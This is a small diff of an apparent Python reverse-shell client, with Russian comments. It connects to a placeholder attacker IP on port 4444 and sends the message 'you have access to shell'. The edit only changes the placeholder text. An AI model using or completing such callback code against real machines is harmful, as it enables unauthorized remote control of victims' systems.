@@ -4,7 +4,7 @@ import os
 
 data = b''
 connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # создаём объект класса socket
-connection.connect(("ip", 4444))  # поключаемся к определённому ip к 4444 порту
+connection.connect(("enter ip", 4444))  # поключаемся к определённому ip к 4444 порту
 connection.send(b"you have access to shell")
 
 
